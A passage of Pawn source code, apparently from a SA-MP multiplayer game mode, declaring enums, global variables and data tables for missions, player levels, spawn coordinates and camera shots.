	cltCost
};
enum ShowData
{
	shwValid,
	shwAuthor[64],
	shwName[128],
	shwSinger[32],
	shwCost,
	shwLength[2]
};
enum ZoneData
{
	zone_name[32],
	Float:zone_minx,
	Float:zone_miny,
	Float:zone_minz,
	Float:zone_maxx,
	Float:zone_maxy,
	Float:zone_maxz
};
enum lastCMDUsersData
{
	lcuCMD[64],
	lcuPlayer[MAX_PLAYER_NAME],
	lcuID
};
enum SignboardData
{
	sbKey[32],
	sbModelID,
	Float:sbCoords[6],
	sbSize,
	sbObject,
	sbUpdateType
};
enum StatsFieldsEnum
{
	sfText[16],
	sfColor[16],
	sfTXD[32],
	Text:sfTD[2]
};
enum TutorialEnum
{
	tutValid,
	tutName[64],
	tutMusic[64],
	tutMusicD[64],
	tutParts,
	tutPartsArrayPos
};
enum TutorialPartEnum
{
	tutpName[64],
	Float:tutpCamPos[3],
	Float:tutpCamLookAt[3],
	tutpLines
};
enum ObjectivesEnum
{
	obUniqueID,
	obName[32],
	obText[200]
};
enum ObjectMaterialsEnum
{
	omName[32],
	omModelID,
	omTXD[32],
	omTexture[32]
};
enum ChatData
{
	bool:chatValid,
	chatTitle[32],
	chatCreationTime[16],
	chatColor,
	chatManager
};
enum AdminToggleTypes
{
	atUID,
	atLevel,
	atCommand[32],
	atHebName[32]
};
enum ClanCameraData
{
	Float:camPos[3],
	camLevel,
	camObject
};
enum ChatActivityBonusData
{
	cabUniqueID,
	cabActivity,
	cabCost,
	cabName[64]
};
enum SilenceData
{
	silName[32],
	silSeconds
};
enum ConnectSpamBlockSystemEnum
{
	csbIP[16],
	csbCount
};
enum ActivityIDsData
{
	aidName[32],
	bool:aidIsCategory,
	aidUID[16]
};
enum CastleAreaInfoData
{
    caID,
	caName[MAX_CASTLE_NAME],
	caAuthor[MAX_PLAYER_NAME],
	Float:caMinx,
	Float:caMiny,
	Float:caMaxx,
	Float:caMaxy,
	Float:caMinz,
	Float:caMaxz,
	caColorR,
	caColorG,
	caColorB,
	caColor[8],
	Float:caTreeX,
	Float:caTreeY,
	Float:caTreeZ
};
enum CastleAreaInfoEnum
{
    bool:caStartCapture,
	caCapture,
	bool:caMissiles,
	caCaptureTime,
	caNewCapture,
	caMissile[16],
	caMissileTo,
	caClans[MAX_CLANS],
	caGangZone,
	Text3D:caText,
	caCaptures,
	caKills,
	bool:caMissileStep
};
enum CastleMissilesInfoData
{
	cmCastle,
	Float:cmX,
	Float:cmY,
	Float:cmZ,
	Float:cmRotX,
	Float:cmRotY,
	Float:cmRotZ
};
enum MissionsInfoData
{
	msID,
	Float:msPos[4],
	Float:msCamera[3],
	msVehicle,
	msIcon,
	msTdName[32],
	msName[32],
	msLevel[32],
	msMoney
};
enum MissionsCheckpointsData
{
	msID,
	msPickup,
	Float:msPos[3]
};
enum AMusicEnum
{
	amTitle[64],
	amLink[64]
};
enum HouseInfoEnum
{
	Float:hx,
	Float:hy,
	Float:hz,
	Float:hp[4],
	hint,
	hcost,
	hsize,
	hpickup
};
/*enum HouseInfoEnum
{
	Float:hPosition[3],
	Float:hTeleport[4],
	hInterior,
	hCost,
	hSize,
	hPickup,
	hFurnitures,
	hKeys[MAX_HOUSE_KEYS]
};*/
enum HouseFurnituresEnum
{
	fName[M_S],
	fCost,
	fCategory,
	fSubCategory
};
enum ViewHQSEnum
{
	hqvalid,
	hqsize,
	hqowner,
	hqarea,
	hqzone,
	Float:hqxmid,
	Float:hqymid,
	Float:hqzmid,
	hqobjects[50],
	hqvehicles[50],
	hqpickups[50]
};
enum FurnituresSubCategories
{
	hcsID,
	hcsSubname[M_S],
	hcsSubid
};
enum FurnituresCategories
{
	hcID,
	hcName[M_S],
	hcCategories
};
enum SpecialThirdVehicleEnum
{
	stvModel,
	stvName[32]
};
enum MoneyAreaEnum
{
	maName[32],
	Float:maCoords[6],
	maGangZoneID,
	maAreaID
};
//=[Elements]===================================================================
new playerinfo[MAX_PLAYERS+1][PlayerInfoData];
new chatinfo[MAX_PLAYERS+1][ChatData];
new vehicleinfo[max_vehicles_][VehicleInfoData];
new ganginfo[MAX_PLAYERS][GangInfoData];
new claninfo[MAX_CLANS][ClanInfoData];
new houseinfo[max_houses][HouseInfoEnum];
new viewhqinfo[MAX_VIEWHQS][ViewHQSEnum];
new cpinfo[max_checkpoints][CPs];
new propinfo[max_properties][PropertiesEnum];
new pickupinfo[MAX_PICKUPS_][PickupInfoEnum];
new objectinfo[max_objects][ObjectInfoData];
new movingtextinfo[MAX_MOVING_TEXTS][MovingTextData];
new ipinfo[MAX_INFOPOINTS][InfoPointEnum];
new areainfo[MAX_AREAS][AreaInfoEnum];
new teaminfo[MAX_TEAMS][TeamInfoData];
new bombinfo[12][BombsEnum];
new sgarageinfo[12][SGarageEnum];
//new objvehinfo[MAX_OBJECTED_VEHICLES][ObjectedVehicleData];
new orginfo[MAX_ORGS][OrgInfoData];
new pptinfo[MAX_PPT][PerPlayer3DText];
new vstoreinfo[MAX_VSTORES][VStoreEnum];
new modehelpheader[MAX_MODE_HELP][32];
new placeinfo[MAX_PLACES][PlacesEnum];
new musicinfo[MAX_MUSICS][MusicData];
new gproperties[MAX_GPROPERTIES][GPropertiesEnum];
new showinfo[MAX_SHOWS][ShowData];
new tutorialinfo[MAX_TUTORIALS][TutorialEnum];
new tutorialparts[MAX_TUTORIALS_PARTS][TutorialPartEnum];
new csbinfo[MAX_SPAM_IPS][ConnectSpamBlockSystemEnum];
new ModelInfo[MAX_MODELS][ModelInfoData];
new Models[ModelTypes];
new PlayerText:ModelsText[MAX_PLAYERS][6]; // 0-Page, 1-Header, 2-Background, 3-NextButton, 4-PrevButton, 5-CancelButton
new PlayerText:ModelsSelect[MAX_PLAYERS][SELECTION_ITEMS];
new cainfo[MAX_CASTLES][CastleAreaInfoEnum];
new counta[MAX_CASTLES][2];
//=[Variables]==================================================================
#if hanukkah_now
new hanpickup;
#endif
new hqlistinfo[4096];
new toganticheat;
new wangv = -1;
new restarting = 0;
new words[100][16];
new words_count = 0;
new capturemembers = 3;
new def_ftttime = 900;
new warinfo[4]; // 0=have, 1=players, 2=seconds, 3=timer
//new rcinfo[4]; // 0=have, 1=players, 2=seconds, 3=timer
new warweapons[] = {22,23,24,25,26,27,28,29,30,31,32,34};
new raceinfo[9]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type, 5=wins, 6=way, 7=duringracetimer, 8=spawns
new raceplayer[MAX_PLAYERS], raceplayers = 0;
new wweinfo[7]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type, 5=pickup, 6=picktimer
new wwejoins[2];
new lottonum[2] = {-1,-1};
new dlottonum[2] = {-1,-1};
new Text:spectext[10], Text:snipertext[2], Text:reloading, Text:badcamera[6], Text:gambletxt[3], Text:unafktext;
new cd[3]; // 0=have, 1=seconds, 2=timer
new cdtext[2][32] = {"~b~$NUM$","~r~go~h~!"};
new Float:VIP_PropertyPercentAdditions[] = {0.0,3.0,5.0,10.0};
new chatlocked;
new achatlocked;
new LockServ;
new kartinfo[6]; // 0=have, 1=players, 2=seconds, 3=timer, 4=pickup, 5=picktimer
new monsterinfo[6]; // 0=have, 1=players, 2=seconds, 3=timer, 4=pickup, 5=picktimer
new vgangzone;
new bool:debugstate = debug_state;
new bool:missions[MAX_MISSIONS];
new houses = 0;
new cps = 0;
new props = 0;
new max_ping = maxping;
new modeuse[32];
new rb = 0;
new randclass = 0;
new boton = 1, botcolor = white, botname[MAX_PLAYER_NAME],
	bottalkingto = INVALID_PLAYER_ID, botcd = 0, botdelay[2] = {0,0};
new Menu:bombshop;
new sraceinfo[6]; // 0=have, 1=players, 2=seconds, 3=timer, 4=wins, 5=type
new actinfo[actInfoEnum];
//new MoneyAR[10] = {-1,...};
new maths[6] = {-1,...};
new trivia[3] = {-1,-1,0};
//new bool:adminsTime = false;
new firework[MAX_FIREWORKS] = {-1,...};
new fireworks = 0;
new useFireworks = 1;
new fireworkTimer;
new fireworkLine = 0;
new siUsed = 0, ccUsed = 0, auctionused = 0, rpasswordUsed = 0;
new Text:hidemap;
new autoM = 0, autoMType = 0;
new reporting[5] = {0,...};
new fpinfo[FirePlaceData] = 0;
new Menu:areYouSure[3];
new kickstarinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=win
new lastB = INVALID_PLAYER_ID, lastBType = 0;
new lastAdvMessage[M_S], advAccess = 0;
new afterHour = 0;
new Menu:shootingMenu;
new stuntingMenu[256];
new Text:movingtext[MAX_MOVING_TEXTS];
new replytest[M_S];
new replytestlevel = 0;
new Float:replytesttime = 0.0;
new replytesttimer;
new npcVehicles[MAX_NPCS] = {-1,...};
new rankname[MAX_RANKS][32];
new serverDetails[serverDetailsEnum];
new MAX_PLAYERS_ = MAX_PLAYERS / 5;
new sellvadv[3] = {INVALID_PLAYER_ID,0,-1};
new auction[4] = {INVALID_PLAYER_ID,0,-1,INVALID_PLAYER_ID};
new voteinfo[VoteEnum];
new crules[MAX_CLANS][10][M_S];
new csigns[MAX_CLANS][3][M_S];
new ccameras[MAX_CLANS][MAX_CLAN_CAMERAS][ClanCameraData];
new ewarinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type
new triviaQuestions[MAX_TRIVIA][TriviaEnum], triviaQuestionsCount = 0;
new thereIsWol = 0, wolPrize = 0;
new rcd[5]; // 0=have, 1=seconds, 2=timer, 3=mode, 4=id
new israelWeather[3];
new headserver = INVALID_PLAYER_ID;
new talkprogram = talkprogramD;
new botDelay = 0;
new bool:FALSE = false;
new bool:prizesys;
new prizesystype;
new USING_NPCS_ = USING_NPCS;
new MAXCLANS = MAX_CLANS;
new battleDialog[300], battleDialogDelay = 0;
new lastChatText[256];
new vstores = 0;
new prizesypickup;
new clanObject[10][24], clanVehicle[7][24], clanPickup[4][24];
new specialActivity = sa_none, nextActivity = sa_none;
new Float:FTTPositions[MAX_FTTPOSITIONS][3], FTTGangZone, FTTTime[2], FTTPlace, FTTPlaces = 0, FTTPickup;
new partyobject[MAX_PARTYOBJ] = {0,...}, partyobjects = 0, partyobjectsMoved = 0, Float:partytele[4];
new wargameinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type
new manhuntinfo[7]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type, 5=hunted, 6=timeleft
new shark[10], sharks = 0;
new noobw[] = {16,18,35,36,37,38,39,51};
new optioned[MAX_PLAYERS] = {INVALID_PLAYER_ID,...}, optioneds = 0;
new sportinfo[10]; // 0=have, 1=players, 2=seconds, 3=timer, 4=win, 5=type, 6=joinedteam1, 7=joinedteam2, 8=param, 9=param2
new sportobj[4];
new Menu:sgarageMenu;
new chatacttimer;
new ammusale[3] = {ammusale_none,0,0};
new fviplist[2][64];
new contents3timer = 0;
new hqeObject = -1;
new abankMoney = 0;
new armyinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type
new bool:returnAttacks = true;
new deathtable[5][3];
new lasttablekiller = INVALID_PLAYER_ID, lasttableclan = 0;
new cannonObjects[20] = {-1,...}, cannonVehicles[10] = {-1,...};
new punishSpam[2] = {INVALID_PLAYER_ID,0};
new Text:TXD[max_txd];
new Text:activityHighScores = INVALID_TEXT_DRAW;
new bool:thereIsAct = false, CActID = -1;
new vehModel[212] = {0,...};
new lastbaner = INVALID_PLAYER_ID, lastbanerbans = 0, lastbanerdelay = 0;
new numOfHelpModes = 0;
new modehelpdialog[M_S_D];
new connected[MAX_PLAYERS];
new admpass[2][32];
new teamactinfo[7]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type, 5=joinedteam1, 6=joinedteam2
new curNews = 0, curNewsDate[32], curNewsString[MAX_NEWS_LENGTH], curNewsFirstLine[128];
new lastSpecialVehicle = 0;
new pastatus = 0, pickact = -1, pickacttimer = -1, pickactzone = INVALID_GANG_ZONE;
new zombiesinfo[4]; // 0=have, 1=players, 2=seconds, 3=timer
new ssObject[70] = {-1,...}, ssObjects = 0, ssRoute = 0, Float:ssObjectPos[70][6];
new AdminTeleports[MAX_ADMIN_TELEPORTS][TeleportsEnum];
new glassinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=removetime
new glassobj[36] = {-1,...};
new grass[200], grasses = 0, grassdelay = 0;
new fountain[100], fountains = 0;
new talkBubble[M_S];
new serverWeather = worlddef_weather;
new csobject[100] = {-1,...}, csobjects = 0, csstatus = 0, csdelay = 0, csmodel = 0, csmodels[] = {19159,18693,18700,18702,1240,363};//, csnpc[10] = {-1,...};
new tfoPlayer[MAX_PLAYERS] = {INVALID_PLAYER_ID,...}, tfoPlayers = 0;
new adauto = 0;
new todayBest, todayDay;
new Text:fadeText = INVALID_TEXT_DRAW;
new musictype[MAX_MUSIC_TYPES][25];
new splitted[3][64];
new lastBanIP[64];
//new File:curFile, curFileName[100], curFileTickCount = 0, bool:usingAnyFile = false;
new adminmusic[100];
new filterscriptLoading = 0, filterscriptUnloading = 0;
new bool:gamemodeFullyLoaded = false, serverUptime = 0;
new moneyPickup[MAX_MONEYPICKUPS] = {-1,...}, moneyPickupTime[MAX_MONEYPICKUPS] = {0,...}, nextMoneyPickup = 0, moneyPickups = 1;
new hostname_[64] = hostname;
new currentShow[3] = {-1,...}, currentShowNPCs[MAX_SHOW_NPCS] = {INVALID_PLAYER_ID,...}, waitingForNPCConnection[MAX_SHOW_NPCS][2], Float:theNewNPCPos[MAX_SHOW_NPCS][4], waitingConnections = 0;
new showParams[20][75];
new lastCMDUsers[9][lastCMDUsersData];
new pirateObject[10] = {-1,...}, Float:pirateObjectPos[10][6], pirateObjects = 0, pirateVehicle = INVALID_VEHICLE_ID, pirateUser[2] = {INVALID_PLAYER_ID,0}, pirateshipobj;
new _tmpString[256];
new Text:adminot = INVALID_TEXT_DRAW;
new partsarraycurrentpos = 0;
new camfloats[3][16];
new wantedGame[64], wantedGameCMD[64], gameWantingIdle = 0;
new heavytdmPickups[3] = {-1,-1,-1}, heavytdmPickupsTimer = 0;
new serverMsg[1024], serverMsgExist = 0;
new briefcaseinfo[6]; // 0=have, 1=players, 2=seconds, 3=timer, 4=time left, 5 = pickup
new waves = 0; // guard_shit
new sta[2] = {0,0}; // guard_shit
new urlautomsg[M_S]; // guard_shit
new propertyPercent = 0, propertyPercentSpam = 0;
new lastConnectIP[16], lastConnectIPTime = 0;
new bool:autoplay = true;
new musictimer = 0;
new lagstatus = 0;
new MissionsInfo[][MissionsInfoData] =
{
	// id, start pos xyza, camera pos xyz, vehicleid, icon map, name english, name hebrew
	{0,{2534.0698,2151.3359,10.4202,57.7040},{2526.7197,2155.0229,10.6828},448,29,"Pizza","ю∙щю· фЇщЎф","ў∙ф", 250},
	{1,{2472.9097,2050.4631,10.6680,38.8349},{2470.6431,2057.4265,10.6719},422,10,"Hamburger","ю∙щю· ффюсх°т°","сщЁхЁщ Єу ў∙ф", 150},
	{2,{2556.4592,1967.0623,10.8398,268.7979},{2564.5999,1960.7401,10.7499},423,17,"Ice cream","ю∙щю· фтьщуф","сщЁхЁщ", 110}
	//{3,{2358.4739,1978.9844,10.7446,155.0251},{2351.0249,1974.5317,10.8585},543,10,"Steak","ю∙щю· фёшщщўщэ","ў∙ф", 20000}
};
new MissionsCheckpoints[][MissionsCheckpointsData] =
{
	// id, checkpoint, xyz
	{0,1,{2877.5154,942.1302,10.7500}},
	{0,2,{1901.6396,738.2040,10.8198}},
	{0,3,{2099.3137,2480.8516,10.8203}},
	{0,4,{1305.7003,2528.8743,10.8203}},
	{0,5,{941.7438,1732.8021,8.8516}},
	{0,6,{403.8005,1156.3459,7.9278}},
	{0,7,{-256.1543,1158.7377,19.7493}},
	{0,8,{-434.1631,2237.2720,42.4297}},
	{0,9,{-14.3238,2348.4360,24.1406}},
	{0,10,{1311.1133,2011.5996,11.2194}},
	{1,1,{1648.9686,2196.4263,10.8203}},
	{1,2,{2656.1821,2200.8650,10.8077}},
	{1,3,{2689.3936,876.8303,9.8438}},
	{1,4,{1469.2267,1058.8682,10.8203}},
	{1,5,{1156.0149,1400.8638,5.8203}},
	{1,6,{992.1448,2351.1470,11.2510}},
	{1,7,{-362.9306,1585.3406,76.5071}},
	{1,8,{2488.7087,1423.2041,10.8203}},
	{1,9,{2367.1274,1674.2444,10.8203}},
	{1,10,{1743.8353,2078.3767,10.8203}},
	{2,1,{2218.2412,1828.9069,10.8203}},
	{2,2,{1686.9998,1450.2228,10.7688}},
	{2,3,{1958.3091,949.5893,10.8203}},
	{2,4,{2048.1370,739.1320,11.2432}},
	{2,5,{1552.5822,1022.0993,10.8203}},
	{2,6,{638.0079,1249.4409,11.6520}},
	{2,7,{766.8727,2000.3801,5.5693}},
	{2,8,{1600.9672,2654.4768,10.8203}},
	{2,9,{2307.5332,2815.8696,10.8203}},
	{2,10,{2385.0864,2472.8933,10.8203}}
};
new levels[][LevelsEnum] =
{
	// level	kills,	name,				maxbank,	ammo,	health,	armour, rob,	maxen
	/* 0	*/ {0,		"Guest",			5000,		1,		0.0,	0.0,	0,		10},
	/* 1	*/ {0,		"Newbie",			5000,		3,		0.0,	0.0,	2,		10},
	/* 2	*/ {20,		"Beginner",			10000,		4,		0.0,	0.0,	4,		20},
	/* 3	*/ {100,	"Novice",			15000,		5,		10.0,	0.0,	6,		35},
	/* 4	*/ {200,	"Criminal",			20000,		6,		20.0,	0.0,	8,		50},
	/* 5	*/ {400,	"Killer",			30000,		7,		30.0,	0.0,	10,		65},
	/* 6	*/ {750,	"Wanted",			40000,		8,		40.0,	0.0,	12,		80},
	/* 7	*/ {1000,	"Gangster",			50000,		9,		50.0,	0.0,	14,		100},
	/* 8	*/ {1500,	"Champion",			65000,		10,		60.0,	0.0,	16,		120},
	/* 9	*/ {2000,	"Hunter",			80000,		11,		70.0,	0.0,	18,		140},
	/* 10	*/ {3000,	"Pro",				100000,		12,		80.0,	0.0,	20,		160},
	/* 11	*/ {4000,	"Super Pro",		150000,		13,		90.0,	0.0,	22,		110},
	/* 12	*/ {5000,	"Mega Man",			200000,		14,		100.0,	0.0,	24,		135},
	/* 13	*/ {6500,	"Veteran",			300000,		15,		100.0,	10.0,	26,		160},
	/* 14	*/ {8000,	"Revenger",			400000,		16,		100.0,	20.0,	28,		185},
	/* 15	*/ {10000,	"Incredible",		500000,		17,		100.0,	30.0,	30,		200},
	/* 16	*/ {12500,	"Evil",				750000,		18,		100.0,	40.0,	32,		230},
	/* 17	*/ {15000,	"Cheater",			1000000,	19,		100.0,	50.0,	34,		260},
	/* 18	*/ {17500,	"Superman",			1500000,	20,		100.0,	60.0,	36,		290},
	/* 19	*/ {20000,	"The Game",			2000000,	22,		100.0,	70.0,	38,		330},
	/* 20	*/ {25000,	"DeathMatch Pro",	3000000,	0,		100.0,	80.0,	40,		370},
	/* 21	*/ {30000,	"Master",			5000000,	0,		100.0,	90.0,	42,		410},
	/* 22	*/ {35000,	"King",				0,			0,		100.0,	100.0,	44,		450},
	/* 23	*/ {40000,	"Devil",			0,			0,		100.0,	100.0,	46,		500},
	/* 24	*/ {50000,	"Angel",			0,			0,		100.0,	100.0,	50,		550},
	/* 25	*/ {65000,	"Legendery",		0,			0,		100.0,	100.0,	55,		666},
	/* 26	*/ {70000,	"God",				0,			0,		100.0,	100.0,	55,		700},
	/* 27	*/ {85000,	"Winner",			0,			0,		100.0,	100.0,	55,		800},
	/* 28	*/ {100000,	"Supreme",			0,			0,		100.0,	100.0,	55,		900},
	/* 29	*/ {125000,	"Ace",				0,			0,		100.0,	100.0,	55,		1000},
	/* 30	*/ {150000,	"SAMP-IL 4 EVER",	0,			0,		100.0,	100.0,	55,		1200}
};
new RandomSpawns[][RandomSpawnsEnum] =
{
	// x, y, z, a, interior
	{2218.6982,1283.5702,10.8203,270.0000,0},
	{2096.2002,1284.7495,10.8203,180.0000,0},
	{2142.0940,1442.5226,10.8203,180.0000,0},
	{1999.5558,1564.7164,15.3672,180.0000,0},
	{1970.2527,1623.2292,12.8620,270.0000,0},
	{2216.4617,1839.7662,10.8203,90.0000,0},
	{2019.1263,1926.6437,12.3414,270.0000,0},
	{2019.5150,1906.3398,12.3084,270.0000,0},
	{2272.3191,2036.5476,10.8203,270.0000,0},
	{2471.3762,1911.0078,9.7656,354.4634,0},
	{2624.7810,2076.6721,14.1161,270.0309,0},
	{2628.7922,2348.2671,10.8203,207.5086,0},
	{2535.9382,2259.9419,10.8203,92.3929,0},
	{2127.5774,2364.8457,10.8203,181.8388,0},
	{1481.4026,2213.2019,11.0234,271.3079,0},
	{1420.8719,2033.1235,14.7396,89.9096,0},
	{1318.8535,1254.4611,14.2731,1.0670,0},
	{1959.0493,1342.8811,15.3746,270.0000,0},
	{2199.8708,1393.1593,10.8203,182.7787,0},
	{2483.5977,1222.0825,10.8203,182.7787,0},
	{2637.2712,1129.2743,11.1797,182.7787,0},
	{2262.0986,2398.6572,10.8203,5.2129,0},
	{2244.2566,2523.7280,10.8203,180.0000,0},
	{2335.3228,2786.4478,10.8203,0.0000,0},
	{2150.0186,2734.2297,11.1763,0.0000,0},
	{2158.0811,2797.5488,10.8203,90.0000,0},
	{1969.8301,2722.8564,10.8203,0.0000,0},
	{1494.2671,2773.5227,10.8203,270.0544,0},
	{1433.4550,2641.1621,11.3926,180.8987,0},
	{1400.5808,2225.7263,11.0234,0.0000,0},
	{1318.7759,1251.3580,10.8203,0.0000,0},
	{1558.0731,1007.8292,10.8125,270.0000,0},
	{1705.2347,1025.6808,10.8203,90.0000,0},
	{2182.7429,1115.7207,12.6484,62.7710,0},
	{2023.6941,1007.2962,10.8203,273.9597,0},
	{2437.6929,1293.4052,10.8203,90.9947,0},
	{2452.1626,1497.7577,11.2538,135.8017,0},
	{2589.3987,1657.0817,11.0234,1.0672,0},
	{1714.2064,1614.4215,10.0156,180.0000,0},
	{2192.5696,1677.2351,12.3672,87.8614,0},
	{2238.4832,2428.8569,10.8203,87.8614,0},
	{2097.4688,2490.1531,14.8390,181.6443,0},
	{1893.6559,2417.6289,11.1782,274.0785,0},
	{1845.9323,2159.9307,10.8203,7.4527,0},
	{1694.0907,2207.2297,11.0692,180.4144,0},
	{1644.4773,1912.9337,10.8203,4.0294,0},
	{1098.3141,1619.0585,12.5469,0.0000,0},
	{1025.9534,2144.9365,10.8203,177.7951,0},
	{411.3962,2533.4890,19.1484,90.0000,0},
	{-778.8023,2745.7263,45.6872,179.6986,0},
	{2163.0583,2795.4783,10.8203,184.1087,0},
	{2262.9167,2775.3733,10.8203,87.6245,0},
	{1376.6473,1019.4727,10.8203,274.6629,0},
	{1490.9999,714.1702,10.8203,176.2987,0},
	{1963.6082,1915.1859,130.9375,271.2396,0},
	{2001.6309,1914.6458,40.3516,271.2396,0},
	{1491.2498,2773.8394,15.9924,271.2396,0},
	{1958.6237,694.7396,14.2681,271.2396,0},
	{1645.9165,1614.2947,14.8222,271.2396,0},
	{1607.1293,1816.6422,10.8203,5.3850,0},
	{1499.5253,2032.7206,14.7396,4.7817,0},
	{1964.2982,1915.0114,130.9375,275.0119,0},
	{369.8243,-2043.8961,7.6719,359.8126,0},
    {325.0051,-1775.4016,4.9110,184.9709,0},
    {154.5413,-1941.4746,3.7734,2.9225,0},
    {211.0533,-1774.9187,3.8404,182.7306,0},
    {369.8813,-1655.7845,32.7059,181.1639,0},
    {-2031.8074,174.0464,28.8359,269.4272,0},
    {-1848.8369,1270.6168,20.4154,210.5088,0},
    {-1873.0016,1189.6779,45.4453,181.9953,0},
    {-1868.5798,1047.6156,46.0898,85.8244,0},
    {-1899.1678,1016.9435,40.5593,270.6928,0},
    {-1926.8235,952.8443,54.4159,180.4519,0},
    {-1984.6594,883.5139,45.2031,271.0062,0},
    {-2018.3838,813.4980,45.5984,273.8262,0},
    {-2117.6499,801.0459,69.5625,88.9578,0},
    {-2129.4636,740.0439,69.5625,177.0053,0},
    {-2131.4583,576.6295,35.1719,193.9255,0},
    {-2109.6411,482.6904,35.1719,98.9846,0},
    {-2135.3687,362.1779,35.1719,179.8253,0},
    {805.7454,-1870.1541,6.1379,113.9965,0},
	{-2265.2839,541.3666,35.0156,272.5729,0},
	{-2260.8208,636.2311,48.9460,178.2587,0},
	{-2585.1716,1102.3281,55.5903,329.4242,0},
	{-2586.1848,1103.0665,55.5903,329.2041,0},
	{-2577.9485,1119.9773,55.6044,153.7591,0},
	{-2532.7532,1145.5861,65.2344,175.3793,0},
	{-2445.0286,1101.6935,55.7147,91.3817,0},
	{-2403.4861,1026.0643,50.0157,359.9109,0},
	{-2370.5247,1041.6334,55.7266,60.3848,0},
	{-2404.8030,959.3821,45.2969,271.5735,0},
	{-2278.1045,958.5306,66.5129,267.8134,0},
	{-2266.4268,958.2126,66.5000,268.4401,0},
	{-2258.7095,958.0025,66.6633,268.4401,0},
	{-2251.0693,961.8110,66.8621,352.1009,0},
	{-2242.8877,924.5412,66.6546,175.0659,0},
	{-2176.7041,918.2699,79.8477,272.2001,0},
	{-2117.4778,925.0164,86.0791,272.2001,0},
	{-2107.5779,899.4196,76.7109,352.1243,0},
	{-2015.3131,857.6700,45.4453,275.3570,0},
	{-2013.7953,807.1531,45.2969,87.6685,0},
	{-2075.4773,805.9670,68.4018,87.6685,0},
	{-2079.3911,817.3040,69.4949,265.6202,0},
	{-1957.8762,797.8786,55.7306,268.7535,0},
	{-1889.9418,746.3691,45.4453,179.1393,0},
	{-1808.0160,771.2361,31.8787,359.3078,0},
	{-1804.9175,907.4219,24.8906,357.4278,0},
	{-1803.9921,941.2214,24.8906,355.2345,0},
	{-1753.7567,961.5361,24.8828,186.3462,0},
	{-1706.0895,922.2576,24.7422,272.8270,0},
	{-1520.9639,925.9390,7.1875,88.2952,0},
	{-1477.9790,754.9825,46.3763,135.8989,0},
	{-1448.6219,774.9763,47.2170,314.7905,0},
	{-1255.7847,954.9302,139.2734,50.6715,0},
	{-1267.8210,966.3453,133.0514,315.1040,0},
	{-1278.3456,976.3602,139.2734,224.5499,0},
	{-1060.2147,907.0626,34.5781,119.9190,0},
	{-1021.1921,935.8571,34.5781,305.7040,0},
	{-960.3574,979.8104,34.5781,305.0774,0},
	{-846.6107,999.4467,24.5882,274.6838,0},
	{-687.5215,948.5159,12.1429,342.9911,0},
	{-658.6411,881.2059,2.0000,227.6834,0},
	{-642.2476,866.1154,2.0000,227.3701,0},
	{-1359.8123,-251.6320,14.1440,315.0892,0},
	{-1364.8552,-245.8510,14.1440,314.7758,0},
	{-1371.4509,-238.3022,14.1484,313.8358,0},
	{-1373.8293,-257.9059,14.2903,317.9092,0},
	{-1378.9966,-252.1470,14.1903,315.0891,0},
	{-1367.8396,-264.6156,14.2903,316.3425,0},
	{-1237.0217,-190.0986,14.1440,116.4574,0},
	{-1304.9657,-325.7573,25.4375,40.6300,0},
	{-1335.1017,-303.8033,25.4375,40.6300,0},
	{-1401.0962,-304.1236,25.4375,305.0624,0},
	{1477.6801,1829.8801,10.8125,168.4621,0},
	{1484.5763,1828.7017,10.8125,174.7288,0},
	{1492.5852,1827.5060,10.8125,174.7288,0},
	{1469.4358,1827.3755,10.8125,182.2489,0},
	{1460.9225,1825.9122,10.8125,182.2489,0},
	{2481.0117,1675.2046,10.8203,175.1550,0},
	{2426.7825,1757.5659,10.6719,1.8800,0},
	{2425.3733,1810.1606,38.8203,353.1301,0},
	{2575.0183,1823.1459,10.8203,273.2293,0},
	{404.3200,2478.9812,16.7700,186.5848,0},
	{408.6276,2484.1343,16.7700,64.4070,0},
	{-1639.9104,1200.4347,7.1931,329.3651,0},
	{-1633.8696,1185.4178,7.1265,85.2762,0},
	{-1714.9695,1114.8132,45.2916,0.6754,0},
	{-1782.0853,1091.7776,45.4453,86.5295,0},
	{-1872.3738,1112.7476,45.4453,94.0496,0},
	{-1988.3485,1161.0609,48.5000,7.2555,0},
	{-2049.7710,1166.3809,45.4453,90.6029,0},
	{-2124.1714,1119.4111,72.4257,98.7496,0},
	{-2126.6804,1102.5782,82.7422,3.8321,0},
	{-2180.9380,1099.3986,80.0078,86.2395,0},
	{-1648.4087,95.7513,-11.1931,312.9320,0},
	{-1652.5254,99.3021,-11.2344,312.9319,0},
	{-1642.1677,90.0196,-11.1949,314.8120,0},
	{-1636.7655,85.1023,-10.0502,316.0653,0},
	{-1632.8201,106.6029,-11.1564,313.5586,0},
	{-1625.0631,114.5056,-11.1633,316.6920,0},
	{-127.5763,-19.2271,3.1172,340.2846,0},
	{1420.3265,-2496.9602,13.5547,274.4730,0},
	{1423.8893,-2487.0513,13.5547,274.4730,0}
};
new RandomCopSpawns[][RandomSpawnsEnum] =
{
	// x, y, z, a, interior
	{2296.2590,2451.5491,10.8203,90.0000,0},
	{2296.9053,2468.7659,10.8203,90.0000,0},
	{2251.5732,2485.9519,10.9908,89.2965,0},
	{2268.1301,2448.3142,3.5313,180.7907,0}
};
new Pictures[][PicturesEnum] =
{
	// camera x, camera y, camera z, x, y, z, a, interior, time
	{1959.1257,1017.5651,992.4688,1952.8580,1017.9661,992.4688,267.1475,10,0},
	{1948.7920,1001.2288,992.4688,1952.4435,996.9414,992.8594,40.5165,10,0},
	{1940.7158,992.8408,992.4609,1941.1642,989.3764,992.4609,359.3246,10,0},
	{1937.2865,1017.8101,992.4688,1930.7357,1017.6057,993.8936,268.6256,10,0},
	{1959.6647,1056.5739,993.2023,1963.0117,1062.3979,994.4688,145.3957,10,0},
	{1991.8201,1017.5253,994.8906,1999.9467,1017.9258,994.6875,88.0784,10,0},
	{2007.7452,1023.2051,994.4688,2010.1840,1026.2886,996.5933,132.2588,10,0},
	{1981.3463,1002.8295,994.4688,1977.2777,1002.2075,994.4688,267.0822,10,0},
	{1965.6771,990.7311,992.4688,1963.8007,991.7985,992.4688,235.4915,10,0}
};
new Pictures2[][PicturesEnum] =
{
	// camera x, camera y, camera z, x, y, z, a, interior, time
